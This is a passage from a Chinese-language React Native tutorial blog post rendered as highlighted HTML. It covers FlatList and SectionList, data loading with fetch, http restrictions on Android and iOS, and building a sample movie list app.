&#125;)</span><br><span class=\"line\">    <span class=\"keyword\">const</span> arr = [ &#123;<span class=\"attr\">key</span>: <span class=\"string\">'Devin'</span>&#125;, &#123;<span class=\"attr\">key</span>: <span class=\"string\">'Julie'</span>&#125;, &#123;<span class=\"attr\">key</span>: <span class=\"string\">'Dan'</span>&#125;, &#123;<span class=\"attr\">key</span>: <span class=\"string\">'Dominic'</span>&#125;, &#123;<span class=\"attr\">key</span>: <span class=\"string\">'Jackson'</span>&#125;, &#123;<span class=\"attr\">key</span>: <span class=\"string\">'James'</span>&#125;, &#123;<span class=\"attr\">key</span>: <span class=\"string\">'Joel'</span>&#125;, &#123;<span class=\"attr\">key</span>: <span class=\"string\">'John'</span>&#125;, &#123;<span class=\"attr\">key</span>: <span class=\"string\">'Jillian'</span>&#125;, &#123;<span class=\"attr\">key</span>: <span class=\"string\">'Jimmy'</span>&#125;, &#123;<span class=\"attr\">key</span>: <span class=\"string\">'Dan'</span>&#125;, &#123;<span class=\"attr\">key</span>: <span class=\"string\">'Dominic'</span>&#125;, &#123;<span class=\"attr\">key</span>: <span class=\"string\">'Jackson'</span>&#125;, &#123;<span class=\"attr\">key</span>: <span class=\"string\">'James'</span>&#125;, &#123;<span class=\"attr\">key</span>: <span class=\"string\">'Joel'</span>&#125;, &#123;<span class=\"attr\">key</span>: <span class=\"string\">'John'</span>&#125;, &#123;<span class=\"attr\">key</span>: <span class=\"string\">'Jillian'</span>&#125;, &#123;<span class=\"attr\">key</span>: <span class=\"string\">'Jimmy'</span>&#125;,</span><br><span class=\"line\">    ]</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (</span><br><span class=\"line\">      &lt;View style=&#123;styles.container&#125;&gt;</span><br><span class=\"line\">        &lt;FlatList</span><br><span class=\"line\">          data=&#123; arr &#125;</span><br><span class=\"line\">          renderItem=&#123;(&#123;item&#125;) =&gt; &lt;Text style=&#123;styles.item&#125;&gt;&#123;item.key&#125;&lt;/Text&gt;&#125;</span><br><span class=\"line\">        /&gt;</span><br><span class=\"line\">      &lt;<span class=\"regexp\">/View&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">    );</span></span><br><span class=\"line\"><span class=\"regexp\">  &#125;</span></span><br><span class=\"line\"><span class=\"regexp\">&#125;</span></span><br></pre></td></tr></table></figure>\n<p>如果要渲染的是一组需要分组的数据，也许还带有分组标签的，那么<code>SectionList</code>将是个不错的选择</p>\n<p><img src=\"/view/posts/e61ae078/SectionList.gif\" alt=\"SectionList\" style=\"zoom:50%;\"></p>\n<figure class=\"highlight jsx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">App</span> <span class=\"keyword\">extends</span> <span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\">  render() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> arr = [</span><br><span class=\"line\">      &#123;<span class=\"attr\">title</span>: <span class=\"string\">'A'</span>, <span class=\"attr\">data</span>: [<span class=\"string\">'Aevin'</span>, <span class=\"string\">'Aan'</span>, <span class=\"string\">'Aominic'</span>]&#125;,</span><br><span class=\"line\">      &#123;<span class=\"attr\">title</span>: <span class=\"string\">'B'</span>, <span class=\"attr\">data</span>: [<span class=\"string\">'Bevin'</span>, <span class=\"string\">'Ban'</span>, <span class=\"string\">'Bominic'</span>]&#125;,</span><br><span class=\"line\">      &#123;<span class=\"attr\">title</span>: <span class=\"string\">'D'</span>, <span class=\"attr\">data</span>: [<span class=\"string\">'Devin'</span>, <span class=\"string\">'Dan'</span>, <span class=\"string\">'Dominic'</span>]&#125;,</span><br><span class=\"line\">      &#123;<span class=\"attr\">title</span>: <span class=\"string\">'J'</span>, <span class=\"attr\">data</span>: [<span class=\"string\">'Jackson'</span>, <span class=\"string\">'James'</span>, <span class=\"string\">'Jillian'</span>, <span class=\"string\">'Jimmy'</span>, <span class=\"string\">'Joel'</span>, <span class=\"string\">'John'</span>, <span class=\"string\">'Julie'</span>]&#125;,</span><br><span class=\"line\">    ]</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (</span><br><span class=\"line\">      &lt;View style=&#123;styles.container&#125;&gt;</span><br><span class=\"line\">        &lt;SectionList</span><br><span class=\"line\">          sections=&#123;arr&#125;</span><br><span class=\"line\">          renderItem=&#123;(&#123;item&#125;) =&gt; &lt;Text style=&#123;styles.item&#125;&gt;&#123;item&#125;&lt;/Text&gt;&#125;</span><br><span class=\"line\">          renderSectionHeader=&#123;(&#123;section&#125;) =&gt; &lt;Text style=&#123;styles.sectionHeader&#125;&gt;&#123;section.title&#125;&lt;/Text&gt;&#125;</span><br><span class=\"line\">          keyExtractor=&#123;(item, index) =&gt; index&#125;</span><br><span class=\"line\">        /&gt;</span><br><span class=\"line\">      &lt;<span class=\"regexp\">/View&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">    );</span></span><br><span class=\"line\"><span class=\"regexp\">  &#125;</span></span><br><span class=\"line\"><span class=\"regexp\">&#125;</span></span><br><span class=\"line\"><span class=\"regexp\">const styles = StyleSheet.create(&#123;</span></span><br><span class=\"line\"><span class=\"regexp\">  container: &#123;</span></span><br><span class=\"line\"><span class=\"regexp\">   flex: 1,</span></span><br><span class=\"line\"><span class=\"regexp\">   paddingTop: 22</span></span><br><span class=\"line\"><span class=\"regexp\">  &#125;,</span></span><br><span class=\"line\"><span class=\"regexp\">  sectionHeader: &#123;</span></span><br><span class=\"line\"><span class=\"regexp\">    paddingTop: 2,</span></span><br><span class=\"line\"><span class=\"regexp\">    paddingLeft: 10,</span></span><br><span class=\"line\"><span class=\"regexp\">    paddingRight: 10,</span></span><br><span class=\"line\"><span class=\"regexp\">    paddingBottom: 2,</span></span><br><span class=\"line\"><span class=\"regexp\">    fontSize: 14,</span></span><br><span class=\"line\"><span class=\"regexp\">    fontWeight: 'bold',</span></span><br><span class=\"line\"><span class=\"regexp\">    backgroundColor: 'rgba(247,247,247,1.0)',</span></span><br><span class=\"line\"><span class=\"regexp\">    borderTopWidth: 1,</span></span><br><span class=\"line\"><span class=\"regexp\">    borderTopColor: '#db5420'</span></span><br><span class=\"line\"><span class=\"regexp\">  &#125;,</span></span><br><span class=\"line\"><span class=\"regexp\">  item: &#123;</span></span><br><span class=\"line\"><span class=\"regexp\">    padding: 10,</span></span><br><span class=\"line\"><span class=\"regexp\">    fontSize: 18,</span></span><br><span class=\"line\"><span class=\"regexp\">    height: 44,</span></span><br><span class=\"line\"><span class=\"regexp\">  &#125;,</span></span><br><span class=\"line\"><span class=\"regexp\">&#125;)</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"网络（进行中）\"><a href=\"#网络（进行中）\" class=\"headerlink\" title=\"网络（进行中）\"></a>网络（进行中）</h2><h3 id=\"使用-Fetch\"><a href=\"#使用-Fetch\" class=\"headerlink\" title=\"使用 Fetch\"></a>使用 Fetch</h3><h4 id=\"发起请求\"><a href=\"#发起请求\" class=\"headerlink\" title=\"发起请求\"></a>发起请求</h4><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fetch(<span class=\"string\">'https://mywebsite.com/endpoint/'</span>, &#123;</span><br><span class=\"line\">  method: <span class=\"string\">'POST'</span>,</span><br><span class=\"line\">  headers: &#123;</span><br><span class=\"line\">    Accept: <span class=\"string\">'application/json'</span>,</span><br><span class=\"line\">    <span class=\"string\">'Content-Type'</span>: <span class=\"string\">'application/json'</span>,</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  body: <span class=\"built_in\">JSON</span>.stringify(&#123;</span><br><span class=\"line\">    firstParam: <span class=\"string\">'yourValue'</span>,</span><br><span class=\"line\">    secondParam: <span class=\"string\">'yourOtherValue'</span>,</span><br><span class=\"line\">  &#125;),</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n<h4 id=\"处理服务器的响应数据\"><a href=\"#处理服务器的响应数据\" class=\"headerlink\" title=\"处理服务器的响应数据\"></a>处理服务器的响应数据</h4><p>Fetch 方法会返回一个<a href=\"https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise\" target=\"_blank\" rel=\"noopener\">Promise</a>，这种模式可以简化异步风格的代码</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getMoviesFromApiAsync</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> fetch(<span class=\"string\">'https://facebook.github.io/react-native/movies.json'</span>)</span><br><span class=\"line\">    .then(<span class=\"function\">(<span class=\"params\">response</span>) =&gt;</span> response.json())</span><br><span class=\"line\">    .then(<span class=\"function\">(<span class=\"params\">responseJson</span>) =&gt;</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> responseJson.movies;</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">    .catch(<span class=\"function\">(<span class=\"params\">error</span>) =&gt;</span> &#123;</span><br><span class=\"line\">      <span class=\"built_in\">console</span>.error(error);</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// async/await 语法：</span></span><br><span class=\"line\"><span class=\"comment\">// 注意这个方法前面有async关键字</span></span><br><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">getMoviesFromApi</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 注意这里的await语句，其所在的函数必须有async关键字声明</span></span><br><span class=\"line\">    <span class=\"keyword\">let</span> response = <span class=\"keyword\">await</span> fetch(</span><br><span class=\"line\">      <span class=\"string\">'https://facebook.github.io/react-native/movies.json'</span>,</span><br><span class=\"line\">    );</span><br><span class=\"line\">    <span class=\"keyword\">let</span> responseJson = <span class=\"keyword\">await</span> response.json();</span><br><span class=\"line\">    <span class=\"keyword\">return</span> responseJson.movies;</span><br><span class=\"line\">  &#125; <span class=\"keyword\">catch</span> (error) &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.error(error);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>测试(catch 住<code>fetch</code>可能抛出的异常)</p>\n<figure class=\"highlight jsx\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">App</span> <span class=\"keyword\">extends</span> <span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">constructor</span>(props)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">super</span>(props);</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.state =&#123; <span class=\"attr\">isLoading</span>: <span class=\"literal\">true</span>&#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  componentDidMount()&#123;</span><br><span class=\"line\">    <span class=\"comment\">//  *****************</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> fetch(<span class=\"string\">'https://facebook.github.io/react-native/movies.json'</span>)</span><br><span class=\"line\">      .then(<span class=\"function\">(<span class=\"params\">response</span>) =&gt;</span> response.json())</span><br><span class=\"line\">      .then(<span class=\"function\">(<span class=\"params\">responseJson</span>) =&gt;</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.setState(&#123;</span><br><span class=\"line\">          isLoading: <span class=\"literal\">false</span>,</span><br><span class=\"line\">          dataSource: responseJson.movies,</span><br><span class=\"line\">        &#125;, <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">      &#125;)</span><br><span class=\"line\">      .catch(<span class=\"function\">(<span class=\"params\">error</span>) =&gt;</span>&#123;</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.error(error);</span><br><span class=\"line\">      &#125;);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  render()&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"keyword\">this</span>.state.isLoading)&#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span>(</span><br><span class=\"line\">        &lt;View style=&#123;&#123;<span class=\"attr\">flex</span>: <span class=\"number\">1</span>, <span class=\"attr\">padding</span>: <span class=\"number\">20</span>&#125;&#125;&gt;</span><br><span class=\"line\">          &lt;ActivityIndicator/&gt;</span><br><span class=\"line\">        &lt;<span class=\"regexp\">/View&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">      )</span></span><br><span class=\"line\"><span class=\"regexp\">    &#125;</span></span><br><span class=\"line\"><span class=\"regexp\">    return(</span></span><br><span class=\"line\"><span class=\"regexp\">      &lt;View style=&#123;&#123;flex: 1, paddingTop:20&#125;&#125;&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">        &lt;FlatList</span></span><br><span class=\"line\"><span class=\"regexp\">          data=&#123;this.state.dataSource&#125;</span></span><br><span class=\"line\"><span class=\"regexp\">          renderItem=&#123;(&#123;item&#125;) =&gt; &lt;Text&gt;&#123;item.title&#125;, &#123;item.releaseYear&#125;&lt;/</span>Text&gt;&#125;</span><br><span class=\"line\">          keyExtractor=&#123;(item, index) =&gt; item.id&#125;</span><br><span class=\"line\">        /&gt;</span><br><span class=\"line\">      &lt;<span class=\"regexp\">/View&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">    );</span></span><br><span class=\"line\"><span class=\"regexp\">  &#125;</span></span><br><span class=\"line\"><span class=\"regexp\">&#125;</span></span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>从 Android9 开始，也会默认阻止 http 请求，请参考<a href=\"https://blog.csdn.net/qq_40347548/article/details/86766932\" target=\"_blank\" rel=\"noopener\">相关配置</a></p>\n</blockquote>\n<blockquote>\n<p>默认情况下，iOS 会阻止所有 http 的请求，以督促开发者使用 https。如果你仍然需要使用 http 协议，那么首先需要添加一个 App Transport Security 的例外，详细可参考<a href=\"https://segmentfault.com/a/1190000002933776\" target=\"_blank\" rel=\"noopener\">这篇帖子</a>。</p>\n</blockquote>\n<h3 id=\"使用其他的网络库\"><a href=\"#使用其他的网络库\" class=\"headerlink\" title=\"使用其他的网络库\"></a>使用其他的网络库</h3><p>React Native 中已经内置了<a href=\"https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest\" target=\"_blank\" rel=\"noopener\">XMLHttpRequest API</a>(也就是俗称的 ajax)。一些基于 XMLHttpRequest 封装的第三方库也可以使用，例如<a href=\"https://github.com/niftylettuce/frisbee\" target=\"_blank\" rel=\"noopener\">frisbee</a>或是<a href=\"https://github.com/mzabriskie/axios\" target=\"_blank\" rel=\"noopener\">axios</a>等。但注意不能使用 jQuery。</p>\n<blockquote>\n<p>在应用中你可以访问任何网站，没有<a href=\"http://en.wikipedia.org/wiki/Cross-origin_resource_sharing\" target=\"_blank\" rel=\"noopener\">跨域</a>的限制。</p>\n</blockquote>\n<h2 id=\"电影列表\"><a href=\"#电影列表\" class=\"headerlink\" title=\"电影列表\"></a>电影列表</h2><blockquote>\n<p>在一个<code>FlatList</code>中展示出电影列表。</p>\n</blockquote>\n<h3 id=\"准备工作\"><a href=\"#准备工作\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h3><p>使用<code>cli</code>工具创建一个工程：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">react-native init SampleAppMovies</span><br></pre></td></tr></table></figure>\n<p>这条命令除了会下载<code>js</code>文件，还会下载在<code>SampleAppMovies/iOS/SampleAppMovies.xcodeproj</code>和<code>SampleAppMovies/android/app</code>下分别创建一个新的 XCode 工程(iOS)和一个 gradle 工程(Android)。</p>\n<h3 id=\"开发\"><a href=\"#开发\" class=\"headerlink\" title=\"开发\"></a>开发</h3><p><code>Android</code>版本：先连接设备或启动模拟器，然后在<code>SampleAppMovies</code>目录下运行<code>react-native run-android</code>，就会构建工程。</p>\n<h4 id=\"电影列表-1\"><a href=\"#电影列表-1\" class=\"headerlink\" title=\"电影列表\"></a>电影列表</h4><p><img src=\"/view/posts/e61ae078/movielist.gif\" alt=\"movielist\" style=\"zoom:50%;\"></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> React, &#123; useState, Component &#125; <span class=\"keyword\">from</span> <span class=\"string\">'react'</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; View, Text, Button, Alert, Platform, Image, ScrollView, TextInput, FlatList, SectionList, ActivityIndicator, StyleSheet, TouchableHighlight, TouchableOpacity, TouchableNativeFeedback, TouchableWithoutFeedback &#125; <span class=\"keyword\">from</span> <span class=\"string\">'react-native'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 原 url</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> REQUEST_URL =  <span class=\"string\">\"https://raw.githubusercontent.com/facebook/react-native/0.51-stable/docs/MoviesExample.json\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">App</span> <span class=\"keyword\">extends</span> <span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">constructor</span>(props) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">super</span>(props);</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.state = &#123;</span><br><span class=\"line\">      data: [],</span><br><span class=\"line\">      loaded: <span class=\"literal\">false</span></span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.fetchData = <span class=\"keyword\">this</span>.fetchData.bind(<span class=\"keyword\">this</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"comment\">// 请求数据</span></span><br><span class=\"line\">  fetchData() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> data = <span class=\"built_in\">require</span>(<span class=\"string\">'./test/moivelist.json'</span>)</span><br><span class=\"line\">    <span class=\"comment\">// 通过定时器 模拟ajax</span></span><br><span class=\"line\">    setTimeout(<span class=\"function\"><span class=\"params\">()</span> =&gt;</span> &#123;</span><br><span class=\"line\">      <span class=\"keyword\">this</span>.setState(&#123;</span><br><span class=\"line\">        data: data.movies,</span><br><span class=\"line\">        loaded: <span class=\"literal\">true</span></span><br><span class=\"line\">      &#125;);</span><br><span class=\"line\">    &#125;, <span class=\"number\">3000</span>)</span><br><span class=\"line\">    <span class=\"comment\">// 真正请求的ajax</span></span><br><span class=\"line\">    <span class=\"comment\">// fetch(REQUEST_URL)</span></span><br><span class=\"line\">    <span class=\"comment\">//   .then((response) =&gt; response.json())</span></span><br><span class=\"line\">    <span class=\"comment\">//   .then((responseData) =&gt; &#123;</span></span><br><span class=\"line\">    <span class=\"comment\">//     // 注意，这里使用了this关键字，为了保证this在调用时仍然指向当前组件，我们需要对其进行“绑定”操作</span></span><br><span class=\"line\">    <span class=\"comment\">//     this.setState(&#123;</span></span><br><span class=\"line\">    <span class=\"comment\">//       movies: responseData.movies,</span></span><br><span class=\"line\">    <span class=\"comment\">//     &#125;);</span></span><br><span class=\"line\">    <span class=\"comment\">//   &#125;);</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"comment\">// 在生命周期中调用接口</span></span><br><span class=\"line\">  componentDidMount() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.fetchData();</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  render()&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!<span class=\"keyword\">this</span>.state.loaded) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"keyword\">this</span>.renderLoadingView();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (</span><br><span class=\"line\">      &lt;FlatList</span><br><span class=\"line\">      data=&#123;<span class=\"keyword\">this</span>.state.data&#125;</span><br><span class=\"line\">      renderItem=&#123;<span class=\"keyword\">this</span>.renderMovie&#125;</span><br><span class=\"line\">      style=&#123;styles.list&#125;</span><br><span class=\"line\">      keyExtractor=&#123;item =&gt; item.id&#125;</span><br><span class=\"line\">    /&gt;</span><br><span class=\"line\">    );</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"comment\">// 加载动画</span></span><br><span class=\"line\">  renderLoadingView() &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (</span><br><span class=\"line\">      &lt;View style=&#123;styles.container&#125;&gt;</span><br><span class=\"line\">        &lt;Text&gt;</span><br><span class=\"line\">          正在加载电影数据……</span><br><span class=\"line\">        &lt;<span class=\"regexp\">/Text&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">      &lt;/</span>View&gt;</span><br><span class=\"line\">    );</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"comment\">// 渲染列表</span></span><br><span class=\"line\">  renderMovie(&#123; item &#125;) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// &#123; item &#125;是一种“解构”写法，请阅读ES2015语法的相关文档</span></span><br><span class=\"line\">    <span class=\"comment\">// item也是FlatList中固定的参数名，请阅读FlatList的相关文档</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> (</span><br><span class=\"line\">      &lt;View style=&#123;styles.container&#125;&gt;</span><br><span class=\"line\">        &lt;Image</span><br><span class=\"line\">          source=&#123;&#123;<span class=\"attr\">uri</span>: item.posters.thumbnail&#125;&#125;</span><br><span class=\"line\">          style=&#123;styles.thumbnail&#125;</span><br><span class=\"line\">        /&gt;</span><br><span class=\"line\">        &lt;View style=&#123;styles.rightContainer&#125;&gt;</span><br><span class=\"line\">          &lt;Text style=&#123;styles.title&#125;&gt;&#123;item.title&#125;&lt;<span class=\"regexp\">/Text&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">          &lt;Text style=&#123;styles.year&#125;&gt;&#123;item.year&#125;&lt;/</span>Text&gt;</span><br><span class=\"line\">        &lt;<span class=\"regexp\">/View&gt;</span></span><br><span class=\"line\"><span class=\"regexp\">      &lt;/</span>View&gt;</span><br><span class=\"line\">    );</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> styles = StyleSheet.create(&#123;</span><br><span class=\"line\">  list: &#123;</span><br><span class=\"line\">    paddingTop: <span class=\"number\">20</span>,</span><br><span class=\"line\">    backgroundColor: <span class=\"string\">'#F5FCFF'</span>,</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  container: &#123;</span><br><span class=\"line\">    flex: <span class=\"number\">1</span>,</span><br><span class=\"line\">    flexDirection: <span class=\"string\">'row'</span>,</span><br><span class=\"line\">    justifyContent: <span class=\"string\">'center'</span>,</span><br><span class=\"line\">    alignItems: <span class=\"string\">'center'</span>,</span><br><span class=\"line\">    backgroundColor: <span class=\"string\">'#F5FCFF'</span>,</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  rightContainer: &#123;</span><br><span class=\"line\">    flex: <span class=\"number\">1</span>,</span><br><span 